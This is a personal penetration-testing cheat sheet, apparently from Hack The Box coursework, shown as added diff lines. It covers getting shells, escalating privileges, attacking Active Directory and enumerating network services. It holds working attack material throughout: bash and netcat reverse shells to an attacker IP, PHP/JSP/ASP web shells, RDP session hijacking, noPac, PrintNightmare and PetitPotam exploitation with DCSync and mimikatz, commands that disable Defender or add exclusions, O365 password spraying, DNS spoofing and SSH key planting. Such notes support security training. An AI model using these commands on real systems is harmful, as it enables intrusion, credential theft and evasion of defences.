+							-uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+						if all of above is successful, move onto acquiring shell IV
+
+		4.) Tomcat			'Godofwar' can be used; may require admin or 'manager' credentials
+						See 'Jerry' in HTB_retired
+						https://github.com/KINGSABRI/godofwar
+						make sure you access the URL path to the .jsp file i.e. /(prefix to war file)/file.jsp
+						Windows Apache Tomcat installer defaults to a blank password for user 'admin'
+
+	B.) Protocol Specific Attacks		RDP(3389) for Windows
+							-Account Impersonation can occur if a user is connected to a compromised machine we have
+							 access to.
+
+							The Following requires SYSTEM privileges AND Microsoft tscon.exe binary
+								-The binary enables users to connect to other desktop sessions.
+								-The above is assuming impersonating is desired WITHOUT a password
+
+							Steps to Perform RDP Session Hijacking
+							--------------------------------------
+							query user <--- command to show users who have a session with foothold machine`
+							tscon #{target-session-ID} /dest:#{OUR_Session_Name}
+
+							Obtaining SYSTEM privs(method does NOT work with Server 2019):
+							--------------------------------------------------------------
+							As local Admin:
+							sc.exe create sessionhijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#0"
+								-creates a service under SYSTEM privs that executes a command with those privs
+								-the service name is 'sessionhijack'
+							net start sessionhijack ---> starts created service
+								-new terminal should appear if successful
+
+
+					
+	D. Execution				run exploit
+						dump file located in home/ShiguruiMuerto/.msf4/loot/
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+IV. Acquiring a Shell
+	A. REVERSE SHELL			https://www.revshells.com/
+		1. Basic bash shell scripts:	rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc [IP] [port] >/tmp/f
+					        bash -c 'bash -i >& /dev/tcp/[ip]/[port] 0>&1'
+						bash -i >& /dev/tcp/10.10.16.3/6666 0>&1 ---> May not work in VM environments because /dev/tcp doesn't exist
+
+		2. Basic Powershell scripts:	See 'Payloads/PS_Payloads'
+
+		3. Reverse Shell 		Is the fastest way to connect, and  reliable, BUT:
+							-once disconnected, have to reuse exploit and retype commands for the shell.
+
+		4. Other languages:		
+
+	B.BIND SHELL
+		1. Basic bash shell scripts	rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvp [port] > /tmp/f
+
+		2. Basic python shell script	See 'Payloads/Python_Payloads'
+
+		3. Basic powershell script	See 'Payloads/PS_Payloads'
+
+		4. More Shells			Type 'PayloadsAllTheThings' in github or go to Resources file in Resources directory
+
+		5. With Bind Shells	 	once a connection drops, you can simply try reconnecting with netcat. BUT:
+							-if bind shell command stops, or if target host reboots;
+								.the exploit needs to be restarted to gain access.
+
+	C. UPGRADING TTY(Teletype Terminals)
+		1. type  		        python -c 'import pty; pty.spawn("/bin/bash")'
+						ctrl^z to put remote shell in backround
+						type in your terminal          stty raw -echo
+										stty size
+						type following to bring backround remote shell back to forground ---> fg
+						press enter twice
+
+		2. Back in target terminal 	type:	
+							-export SHELL=bash
+							-stty rows [first int from 'size'] columns [second int]
+							-export TERM=xterm-256color <--- this makes it so you can backspace
+
+	D. WEB SHELL
+		1. If web app lacks filtering:	A webshell can be achieved via a web script
+							-the output is printed onto the webpage
+						Can attempt to test if app is vulnerable to injection
+							-php:            <?php system($_REQUEST["cmd"]); ?>
+							-jsp:           <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+							-asp:           <% eval request("cmd") %>
+
+		2. Laudanum and Nishang		Contains premade web shells that can be uploaded to a webpage if filtering is weak
+						Locations:
+							-/usr/share/webshells/laudanum
+							-/usr/share/nishang/Antak-Webshell
+							-Details on usage here ---> home/ShiguruiMuerto/Documents/HTB_Pentesting/Payloads/Notes_LDAPsteps_etc
+
+		3. Common Web directories:	Apache         /var/www/html/
+						Nginx          /usr/local/nginx/html/
+						IIS            c:\inetpub\wwwroot\
+						XAMPP          C:\xampp\htdocs\
+							-Can try echoing the above injections into a file in mentioned paths.
+				       				.echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
+								.Add this to end of url path to test command functionality ---> ?cmd=id
+
+		4. Benefits:			Bypasses firewall because we are NOT opening a NEW connection; using existing port 80 or 443 ports
+						Even if server reboots, script should still be in the original location
+
+	E. Windows
+		1.) Pass the hash		evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
+
+	F. Various Linux Shell Commands		PERL 	---> perl -e 'exec "/bin/sh";'
+
+						RUBY 	---> ruby: exec "/bin/sh"
+
+						LUA 	---> lua: os.execute('/bin/sh')
+
+						AWK 	---> awk 'BEGIN {system("/bin/sh")}'
+
+						FIND	---> find / nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+							     find . -exec /bin/sh \; -quit
+
+						VIM	---> vim -c ':!/bin/sh'
+
+						VIM	---> :set shell=/bin/sh
+							     :shell
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+V. Escalating Privilege
+	A. PrivEsc
+		1. Scripts			Often used to enumerate the system from target shell that was achieved.
+							-this is risky because often the firewall or antivirus software will detect the scan and sound 
+							 alarm.
+						common scrips for linux priviledge enumeration:
+							.LinEnum and linuxprivchecker
+						common scripts for Windows privilege:
+							.Seatbelt and JAWS.
+						repository for usefull scripts
+							https://github.com/carlospolop/PEASS-ng
+
+		2.) PrivEsc Checklists		https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
+						https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation
+
+	B. KERNAL EXPLOITS			unpatched/unupdated OS' can be vulnerable to certain exploits
+							-once enumeration is complete, use searchsploit of msfconsole to find a potential exploit to use
+	C. SOFTWARE
+		1. If target host is linux OS   type the following to look for software on system      
+							-dpkg -l
+							-consider which may be vulnerable
+
+		2. If target host is Windows OS type the following to look for software on system      
+							-C:/Programfiles
+							-consider which may be vulnerable
+
+	D. USER PRIVILIGES
+		1. Linux and windows has ways to grant users root/admin priviliges via:
+			-sudo
+			-SUID
+			-Windows Token Priviliges
+		2. Linux
+			- look for SUID bit on an executable owned by root <---runs program AS root, regardless
+			  of who executes.
+			- sudo -l       can show what priviliges the linux user has when using sudo
+				.if /bin/bash is shown next to nopasswd and a user, go to sudo -u
+			- su -          may allow switching to root user
+			- sudo -u       typing username after -u may allow commands with that user
+				. sudo -u [user] /bin/bash      might execute a shell as that user
+			- GTFObins has a list of binary that can be abused using sudo
+			- If access to schedule software:
+				.Scheduled tasks with CRON can be leveraged to obtain a shell(bind/reverse)
+				.These files may be located in
+
+					    /etc/crontab
+					    /etc/cron.d
+					    /var/spool/cron/crontabs/root
+				.chown may be used to give access to file by hijacked user
+	E. EXPOSED CREDENTIALS
+		1. Log files, configurations files, and history files may have user credentials
+			-for linux look in bash_history
+			-The enumerations scripts mentioned usually look for passwords in these files
+			-MAY REQUIRE EXTENSIVE MANUAL ENUMERATION OF THESE FILES! LOOK CAREFULLY AND THINK ABOUT CONTEXT!
+	F. SSH
+		1. If read access is available to /.ssh directory, keys may be readable in
+			-/home/user/.ssh/id_rsa  or  /root/.ssh/id_rsa
+			-copy the key by opening it via vim/nano
+			-save it to your own file
+			- chmod 600 [filepath] to escalate restrictions on file, thus allowing SSH.
+			-ssh user@host -i [path to private key]
+		2. If write access, perform the following on our system
+			-command        ssh-keygen -f [path of private key]
+			- a .pub key path should be given. Go there and copy it.
+			-send pub key to target host    echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
+			-should be able to ssh with our private key
+				ssh root/host -i [path to private key]
+
+		3. If there are Issues connecting:	use -vvv
+							Look at where communication stops
+							scroll up and try to determine logically why it stopped where it did
+							could be that an incorrect algorithm was passed during key exchange
+								-pay mind to where server makes algorithm suggestions
+								-use -o Kexalgorithms=[a server suggested algo]
+	
+	G. Windows PrivEscal	Check files for easy creds:
+				---------------------------
+				ConsoleHost_history 
+				shows console/terminal cmd input history
+					-Might show env variables with user/password info, or interesting files
+				Try the following commands:
+					-type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+					-type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+					-type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+					-cat (Get-PSReadlineOption).HistorySavePath
+					-cat (Get-PSReadlineOption).HistorySavePath | sls passw
+
+		1.) CVEs	CVE-2021-42278 and 42287: SAMaccountname change > tricking KDC:
+				---------------------------------------------------------------
+
+					Requirements:
+					-------------
+					Must be Authenticated User
+					Preferably local admin or SYSTEM if done on the target via RDP
+
+					Check machineaccountquota:
+					--------------------------
+					Get-ADDomain | Select-Object -ExpandProperty DistinguishedName | Get-ADObject -Properties 
+					'ms-DS-MachineAccountQuota'
+
+					If > 0, can be performed manually IF able to write to DC computer object:
+					-------------------------------------------------------------------------
+					Get-ACL "AD:\$(Get-ADDomain domain.local)" | Select-Object Path -ExpandProperty Access 
+					| Where-Object {$_.IdentityReference -match 'DOMAIN\\user'}} <---replace 'DOMAIN\\user' with desired ACE principal
+
+						-Look for 'First Degree Object Control' via Bloodhound
+						-Look for Write privileges on Domain Controller Object
+						-Search 'samaccountname-spoofing' in 'Resources' directory for website to do this manually w/PowerMad
+							.Steps are also in "PrivEscal" directory
+
+					Use automated tools(from WITHIN Repo):
+					--------------------------------------
+					git clone https://github.com/Ridter/noPac.git
+
+					sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
+						-determine if vulnerable
+						-quota should be > 0
+
+					sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  
+					-dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
+						-this method is noisy as it uses PsExec
+
+					sudo python3 noPac.py DOMAIN.LOCAL/user:pass -dc-ip [IP] -dc-host DC01 --impersonate administrator 
+					-use-ldap -dump -just-dc-user DOMAIN/administrator
+
+				CVE-2021-34527 and CVE-2021-1675: PrintNightmare:
+				-------------------------------------------------
+					
+				git clone https://github.com/cube0x0/CVE-2021-1675.git
+
+					Check if vulnerable:
+					--------------------
+					rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
+
+					May Need to uninstall Impacket and install cube0x0's version:
+					-------------------------------------------------------------
+					pip3 uninstall impacket
+					git clone https://github.com/cube0x0/impacket
+					cd impacket
+					python3 ./setup.py install
+
+					Use Pivoting techniques to route traffic accordingly:
+					-----------------------------------------------------
+					msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f dll > backupscript.dll										
+					Start an SMB server on pivot, if possible.
+						-if not, try to use socat
+					
+					Create listener matching msfvenom payload
+
+					Execute:
+					--------
+					sudo python3 CVE-2021-1675.py inlanefreight.local/<username>:<password>@172.16.5.5 '\\IP\CompData\backupscript.dll'
+
+				CVE-2021-36942: PetitPotam(MS-EFSRPC)
+				-------------------------------------
+
+					Setup Relay server:
+					-------------------
+					sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp 
+					--adcs --template DomainController
+
+					If CA is not known, try the following with certi.py:
+					----------------------------------------------------
+					https://github.com/zer1t0/certi
+					certi.py list 'contoso.local/Han' -k -n --dc-ip 192.168.100.2 --class ca
+					
+					Verify via Get-ADComputer or crackmapexec
+
+					Coerce DC:
+					----------
+					python3 PetitPotam.py [your_IP] {DC_IP}
+
+					If a base64 encoded ticket is recieved by ntlmrelay server, get a TGT:
+					----------------------------------------------------------------------
+					https://github.com/dirkjanm/PKINITtools
+					python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 [base64] dc.ccache
+
+					Set CCNAME:
+					-----------
+					export KRB5CCNAME=dc.ccache
+
+					Perform DCSYNC:
+					---------------
+					secretsdump.py FQDN/user@target_FQDN -just-dc-user domain/administrator -k -no-pass 
+
+					AS-REP Roast using AS-REP Encryption Key recieved from TGT reply:
+					-----------------------------------------------------------------
+					python /opt/PKINITtools/getnthash.py -key [key_from_TGT_Reply] DOMAIN.LOCAL/DC_NAME$
+						-should recieve the NTLM for the DC
+
+					Using DC NTLM Hash to DCSYNC:
+					-----------------------------
+					secretsdump.py -just-dc-user domain/administrator "DC_name$"@172.16.5.5 -hashes lmhash:ntlm
+
+					Using Rubeus with base64 Certificate Blob followed by DCSYNC with mimikatz:
+					---------------------------------------------------------------------------
+					Rubeus.exe asktgt /user:DC_Name$ /certificate:[base64 blob] /ptt
+					
+					mimikatz.exe "privilege::debug" "lsadump::dcsync /user:domain\krbtgt" exit
+						-requires elevated shell
+					
+
+
+	H. Windows AV Evasion	Get-MpComputerStatus | select AntispywareEnabled,AntivirusEnabled,BehaviorMonitorEnabled<----Check if AV is active
+				reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit 		<----Shows what is being logged
+				Set-MpPreference -DisableRealtimeMonitoring $true 					<----may require admin privileges
+				Set-Executionpolicy Unrestricted -Scope Process 					<---may allow script execution
+				Set-ExecutionPolicy Bypass -Scope Process -Force 					<---may allow script execution
+				Add-MpPreference -ExclusionPath C:\[path-to-working-folder] 				<---tells AV to ignore this folder
+					-Generates 'Information' event log 5007; no desktop alerts, though.		<---stealthy?
+
+		1.) Applocker	Evading Applocker blocking cmd.exe and powershell
+				
+				Check Applocker configurations:
+				-------------------------------
+				Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+				Other powershell locations for 64bit:
+				-------------------------------------
+				%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+				%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe
+				%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe
+				%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell_ise.exe
+
+				32bit:
+				------
+				%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe
+				%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell_ise.exe
+
+		2.)Language	Enumerating Language Mode:
+				--------------------------
+				$ExecutionContext.SessionState.LanguageMode	<---Admin uses this to disable dll, .NET, powershell class access
+				$ExecutionContext.SessionState.LanguageMode = "FullLanguage" <--- may need admin privs for this; might not work
+
+		3.)LAPS		Import-Module LAPSToolkit.ps1 
+				-----------------------------
+				Find-LAPSDelegatedGroups <--- shows a list of potential groups who can read admin password on the listed OU
+				Get-LAPSComputers <--- shows  ALL computers that utilize LAPS
+				Find-AdmPwdExtendedRights <--- Users gain 'All Extended Rights' by adding a computer to the Domain. Can read admin passwd
+							       Looks for ALL groups within domain to check for which have read access to LAPS
+							       Also looks for users with 'All Extended Rights' permissions
+				Get-LAPSComputers <--- Shows Computers with LAPS enabled and may also show cleartext randomized password w/ expiry
+				
+				See bottom of this document for more information
+
+		4.) AV Meth	Start with 'Get-MpComputerStatus' and work down.
+				Go to 'Living off the land' after /INTERNAL
+
+		5.) AdvFirewall	Punch a hole in a firewall on current host:
+				-------------------------------------------
+				netsh advfirewall firewall add rule name=fwd dir=in action=allow protocol=TCP localport=5446
+				
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+VI. INFOGAH<>VULNASS Network Services
+	A. FTP(File Transfer Protocol)
+		1. Remote access	FTP command will connect to a port using the protocol.
+					default syntax
+						.tnftp [user]@[ip] [port]
+					if using SSL to comm, use:
+						.command	openssl s_client -connect [IP]:[port] -starttls ftp
+					"-p" allows opperation behind a filtering firewall
+					supports common commands such as "cd" "get" "ls"
+					username to use when wanting to connect without an account
+						.anonymous
+		2. FTPS
+					secure version of FTP
+		3. Banner 
+					use command:	nc -nv [IP] port
+					tnftp command from above should also show banner preceded by code 220 or 221
+		4. nmap -sC 
+					may list contents in root directory without having to connect manually
+
+		7.) FTP Bruteforce	nmap --script ftp-brute -p 21 <host>
+						-may return valid credentials
+						-https://www.infosecmatter.com/nmap-nse-library/?nse=ftp-brute
+					hydra
+					medusa
+
+		8.) FTP Bounce Attack	Uses the PORT command in FTP to enumerate another host on the target network
+					nmap -p 80 -b anonymous:password@IP PrvtIP_in_target_network <--- looks for information on port 80 @private_network
+			
+	B. SMB(Server Message Block)
+					Information to look out for:
+						.group and user <rid>		#can be used to further enumerate; finding path to priv esc ; pspy64
+					allows access to SHARED NTFS folders via shared permissions through NTFS and ACL.
+						.connecting to SMB server puts you into a file/directory with r/w permissions determined by ACLs
+					the level of interaction is determined by the access control list(ACL)
+						.an SMB permissions list
+						.contains access control entries(ACEs) ; typically made up of users and groups
+					GUI access:
+						-type run in start menu
+						-type traditional syntax ---> \\IP\Share
+
+		1. nmap 		has a scan that can find the OS of windows using SMB
+						-nmap --script smb-os-discovery.nse -p[PORT] [IP]
+
+		3. "smbclient" tool 
+					See 'SMB' folder in 'Footprinting' for useful information
+					"-L" option lists available shares between hosts.
+						.command syntax		smbclient -L [IP]
+					"-N" option supresses password prompt.
+					"-U" can be followed by a username
+						.guest may be able to log in without a password
+					'!' can be used to execute remote system commands without interupting connection
+							.	!cat file.txt
+					proper syntax as follows
+						.smbclient [options] \\[IP]\[sharename]
+					IF successful connection, look for files with NTFS permissions that allow rwx
+						.sudo mount -t cifs -o username=htb-student,password=Academy_WinFun! //ipaddoftarget/"Company Data" 
+						 /home/user/Desktop/
+							-o credentials=/path/to/credentialfile
+							-format for credential file;
+								username=plaintext
+								password=Password123
+								domain=.
+						.this creates an access point on local host allowing file transfer via the directory on desktop.
+
+		4. SMB Admin tools
+					command:	smbstatus
+						.shows list of connections to SMB ports as well as shares connected to
+
+		5. rpcclient		https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf <--- cheatsheat
+					syntax:	rpcclient [options] host
+							rpcclient -U=guest -p 445 10.0.0.2
+					Samba suite tool used a lot by admins
+					can interact with Windows smb server from Linux
+					usefull if smbclient or nmap don't produce much information
+					check Footprinting directory for picture 'RPCclient'; located in 'SMB'
+						.useful commands are listed
+					
+					Syntax for NULL login:
+					----------------------
+
+					rpcclient -U'%' [IP]
+					rpcclient -U "" -N [IP]
+
+					Commands
+					--------
+					https://www.hackingarticles.in/active-directory-enumeration-rpcclient/
+					enumprivs
+
+		6.Other Tools
+					CrackMapExec
+						.syntax		crackmapexec smb [IP]
+					enum4linux-ng 
+						-in scripts
+					smbmap
+						.Provides Permissions
+						.smbmap -H [IP] -r share-name ---> -r searches recursively
+						--download "share\file.txt"
+						--upload "share\file.txt"
+
+		8. CLEANUP
+					check 'Computer Management' at remote target
+						.under 'Shared Folders' tree, this will show you as a user, and will also show what files are being accessed
+						.under 'Shares', will show a tally under '# Client Connections'
+					Event Viewer shows upon connection:
+						.5379
+						.4672
+						.4624
+					look for ways to cover your tracks
+					if authentication is required by target client, then set the user and password with -username and -password options,
+					then mount server share to client
+
+		9. Windows cmd.exe	dir \\IP\Share ---> Looks in share
+					net use n: \\IP\Share ---> mounts contents of Share to a custom made drive letter 'n:'
+					/user:username password ---> tacked onto net use command in order to provide credentials
+					dir n: /a-d /s /b | find /c ":\" ---> a command that shows number of files in drive 'n:'
+						-/a-d <--- /a is attribute and -d is NOT directory
+						-/s   <--- displays files
+						-/b   <--- uses bare format
+
+		10. Windows PS		Get-ChildItem \\IP\Share\
+					Alias:
+						-gci
+					New-PSDrive -Name "N" -Root "\\IP\Share" -PSProvider "FileSystem" <--- acts as 'net use'
+					In order to use credentials with above:
+						-$username=''
+						-$password=''
+						-$secpassword=ConvertTo-SecureString $password -AsPlainText -Force
+						-$cred=New-Object System.Management.Automation.PSCredential $username, $secpassword
+						-Then use '-Credential $cred' at end of 'New-PSDrive' command
+
+					(Get-ChildItem -File -Recurse | Measure-Object).Count <--- similar to dir command above
+					Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
+					Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List <--- similar to grep
+
+		11. Linux		grep -rn /mnt/Finance/ -ie cred <--- searches for files containing the string 'cred'
+						-recursive, print line number, case INsensitive, pattern enabled
+
+		12. User enum		search 'crackmap'
+
+	C. SNMP(Simple Network Management Protocol)
+		1. TOOL:        snmpwalk
+					-a SNMP application that uses the protocol GETNEXT request to inquery info about a tree; 
+					-an object identifier(OID) can be given, thus asking for info in subtree below said object.
+				'man' snmpcmd or snmpwalk for info on options given
+				syntax
+					-snmpwalk [options] [public or private] [IP] [OID]
+					-snmpwalk -v2c -c public 10.129.14.128
+
+		2. TOOL:        onesixtyone
+					-can be used to identify community strings
+					-an SNMP scanner
+				syntax
+					-onesixtyone [option] host [community;IP]
+				can use option "-c dict.txt" in order to bruteforce community string names associated with IP
+					-onesixtyone -c /usr/share/wordlists/SecLists/Discovery/SNMP/snmp.txt 10.129.14.128
+				Strings may be difficult to read; there for use crunch below
+		
+		3. TOOL:	crunch
+					-can search for strings containing patterns/characters specified and output to a file
+
+		4. TOOL		braa
+					-bruteforces OIDs, using SNMP GET requests to acquire information from each OID in supplied list
+				see man page
+				syntax
+					-braa <community string>@<IP>:.1.3.6.*
+		5. TOOL		msfconsole
+					-search snmp enumeration module
+					-use 7
+					-enter target RHOST
+					-run
+
+		6. PORT		161/udp
+
+		7. MIBs		sudo apt-get install snmp-mibs-downloader
+					-After downloading, comment out the 'mibs' line in /etc/snmp/snmp.conf
+					-Will translate IPv6 decimal into hex readable; traditional format
+					-MIBs and OID numbers don't show 
+
+	D. REDIS 
+		1. command to connect to this type of server:
+			-	redis-cli -h [ip]
+			-if port is needed then -p [port]
+		2. List of SERVER commands
+			-https://redis.io/commands
+			-command:	index [number]	takes you to that index
+			-command:	dbsize		shows number of keys in current index
+			-command:	key *		lists key names in current index
+			-command:	get [key name]	will cat the key into current shell
+
+	E. NFS(NETWORK FILE SYSTEM)
+		1.) Primarily used with Linux/Unix
+		2.) Enumerate with nmap:	sudo nmap -sV -sC -p ports IP
+						sudo nmap -sV --script nfs* IP -p ports 
+							.can show mount files and versions of RPC ports on target
+
+		3.) Confirm found files with:	command:	showmount -e [target ip]
+		4.) Perform the following:	mkdir [directory you want to mount to target]
+						mount -t nfs [target ip]:/path-to-mountfile-from-showmount ./local-directory-you-made -o nolock
+						no output should be given if this is successfull
+						cd or ls directory to enumerate further
+						umount ./local-directory-you-made
+							.this dismounts remote file
+
+		5.)File permissions		if ls -la shows file permission for share to be 'nobody':
+							-must mount share as root.....don't use sudo; login as root and mount
+							-if you don't, you won't be able to access mounted directory
+
+
+	F. DNS(Domain Name System)Server
+		1.)command:	dig
+
+		2.)Syntax:	dig [options ][FQDN] @[IP of DNS server we wish to query]
+
+		3.)Options:	ns	looks for other name servers that have info on FQDN
+				any	looks for ANY information the DNS server is willing to show for the FQDN
+				axfr	requests a zone transfer from @IP for the FQDN; if target is misconfigured, local hosts/subdomains on their 
+				network can be exposed, showing IPs ,MX, AAAA, SOA, etc
+					-use bruteforce tactics against domains that don't allow axfr
+					-DNS config misconifgurations that cause this to be possible:
+						.allow transfer 10.0.0.0/24 <------this is an example; any host on that network, under the subnet mask 
+						 24 could transfer a zone
+					.allow transfer any
+
+		4.)Scripts:	location: /Documents/Scripts/Enumeration_Scripts/OSINT
+
+		2.)Syntax:	dig [options ][FQDN] @[IP of DNS server we wish to query]
+
+		3.)Options:	ns	looks for other name servers that have info on FQDN
+				any	looks for ANY information the DNS server is willing to show for the FQDN
+				axfr	requests a zone transfer from @IP for the FQDN; if target is misconfigured, local hosts/subdomains on their
+					network can be exposed, showing IPs ,MX, AAAA, SOA, etc
+					-use bruteforce tactics against domains that don't allow axfr
+					-DNS config misconifgurations that cause this to be possible:
+						.allow transfer 10.0.0.0/24 <------this is an example; any host on that network,
+						 under the subnet mask 24 could transfer a zone
+						.allow transfer any
+
+		4. Scripts:	location: /Documents/Scripts/Enumeration_Scripts/OSINT
+				-SubDomain_Brute.sh
+					.This will take a word list of subdomain suffixs and query a name server; Domain Name Brute Forcing 
+					.output should be subdomain name, record type, IP
+					.wordlist location:	/Documents/Scripts/Enumeration_Scripts/OSINT/Subdomain_Wordlists
+				-DNSResolution.sh
+					.This will search for subdomains listed within SSL certificate at crt.sh webpage.
+					.Then it will list resolved domain names with their IPs
+				-ShodanIPlist.sh
+					.This will take the list created by DNSResolution, 
+					.Create the list of resolved IPs
+					.Uses shodan on the list to output elaborated information on IPs
+		5.)command:	dnsenum
+
+		6.)syntax:	dnsenum --dnsserver [IP] --enum -p 0 -s 0 -o subdomains.txt -f [wordlist location/path] [domainname to enumerate]
+
+		7.) See Footprinting directory, DNS section
+
+		8.)command:	dnsrecon <---python
+					-Can find extensive information such as SPF records
+
+		9.) SPF/DMARC	Add the following subdomain names to a domain to potentially find the SPF records:
+					_dmarc.youtube.com
+					_spf.youtube.com
+
+		10.) Fierce	Used to enumerate DNS records for a domain or/and subdomain
+
+		11.) DNS Attcks
+				Domain takeovers ---> when a cname has expired, but is still available; can hijack and create malicious website
+						      Users who connect to the main domain, will reach content in hijacked cname subdomain
+						      	-https://github.com/EdOverflow/can-i-take-over-xyz <---MORE INFO!
+
+				Check for Domain Takeover:
+				--------------------------
+				Enter subdomain url in browser
+				If a page comes up showing/suggesting 3rd party, AND recieve error code 404, check dig
+				dig cname subdomain.sub.com @dns
+				If a cname is found, create accound with 3rd party service requesting to use the domain to the 'right' of cname
+				create a simple index.html file with a custom string
+			
+				Domain Spoofing aka DNS Cache Poisoning using Ettercap. This works on the LOCAL network:
+				----------------------------------------------------------------------------------------
+				Choose an interface to listen on
+				Add entry in /etc/ettercap/etter.dns ---> domain.com	A   IP ---> where domain.com=target and IP=attacker IP
+				Start tool			     ---> Top right menu > Hosts > Scan for hosts (performs ARP scan)
+				Add Target IP to Target 1
+				Add default gateway IP to Target 2
+				Activate dns_spoof		     ---> Plugins > Manage Plugins
+
+				Once started, If target IP visits domain.com, they will recieve A record resolution to attacker IP
+				Ping should also resolve to attacker IP from target IP
+
+		12.) Enum Sub	Tools to enumerate subdomains:
+					-Subfinder <--- in ~/go/bin
+					-Sublist3r <--- in 'OSINT' directory
+					-Subbrute  <--- in 'OSINT' directory
+						-Allows brute forcing domains on a network that is not connected to the internet.
+						-Good for internal pentests
+
+	G. SMTP(Simple Mail Transport Protocol)
+		1.) Typically on port 25
+
+		2.) Service should say smtp, smtpd, or some variation of such
+
+		3.) Connect command:	nc -nv [IP] [SMTP port]
+
+		4.) Command:		VRFY [username]
+						-may not function properly; server configuration can return a result that doesn't actually exist
+					EXPN user_list
+						-lists all users apart of 'user_list' where 'user_list' can be a group in the company
+					RCPT [user]
+						-this may also be used to enumerate users
+
+		5.) Start session cmd:	EHLO or HELO [Hostname of SMTP server]
+					-try both
+					-see Footprinting directory; SMTP section
+
+		6.) NMAP enum:		sudo nmap [IP] -p [SMTP port] --script smtp-open-relay -v
+					-this script sends multiple emails to check if the server is an OPEN relay; if yes, it can allow ALL email domain
+					 names; can be used for spoofing by using the open relay server as a source address, masking the attacker address
+					-Relay would thus be configured to accept 0.0.0.0/0
+
+		7.) User Enum		smtp_user_brute.py in /Scripts/Enum/SMTP_Scripts
+						-uses word list to VRFY existence of users on server
+					smtp-user-enum in same directory as above
+						-consider if target is under a domain(AD) ---> Need the -D flag
+						-gives options for command to enumerate with
+
+		8.) Evolution		GUI mail application
+					sudo apt-get install evolution
+					https://www.youtube.com/watch?v=xelO2CiaSVs <--- walkthrough on how to set it up
+
+		9.) MX			dns record MX holds mailserver used by domain
+						-host -t MX htb.com
+
+		10.) Cloud Enum		Enumerating O365 by Microsoft:
+					------------------------------
+					Go to ~/Documents/Scripts/Enumeration_Scripts/SMTP_Scripts/o365spray
+					python3 o365spray.py --validate --domain msplaintext.xyz ---> If validated, then:
+					python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
+
+
+					Password Spray O365:
+					--------------------
+					python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
+
+					CredKing: AWS Lambda, GMail, or OKTA
+					-------------------
+					~/Documents/Scripts/Enumeration_Scripts/SMTP_Scripts/CredKing
+
+		11.) Open Relay Attack	use 'NMAP enum: above. 
+					
+					Sending a message via open relay:
+					---------------------------------
+					swaks --from [source] --to [destination] --header 'Subject: ' --body '' --server [OpenRelay_ServerIP]
+
+	H. IMAP(Internet Message Access Protocol) and POP3(Post Office Protocol3)
+		1.) on ports:		110/tcp
+					143/tcp
+					993/tcp SSL/TLS
+					995/tcp SSL/TLS
+
+		2.) nmap:		sC contains default scripts for IMAP enum
+					Could show org name and domain name
+
+		3.) curl:		curl imaps://IP -k -v
+					curl option:	--user user:password
+						-can be used to authenticate to IMAP server
+						-may give TLS version used by server
+						-may show available INBOXs
+						-may give Domain names and emails
+						-does NOT let you input commands
+
+		4.) netcat:		nc -nv [IP] [port]
+						-can give service version for both IMAP and POP3
+						-can input commands if NO AUTH is required(no SSL)
+
+		5.) openssl:		openssl s_client -connect 10.129.14.128:imaps
+					openssl s_client -connect 10.129.14.128:pop3s
+						-use if TLS is required
+						-both should give interactive capabilities; i.e. inputing commands, logging in, etc
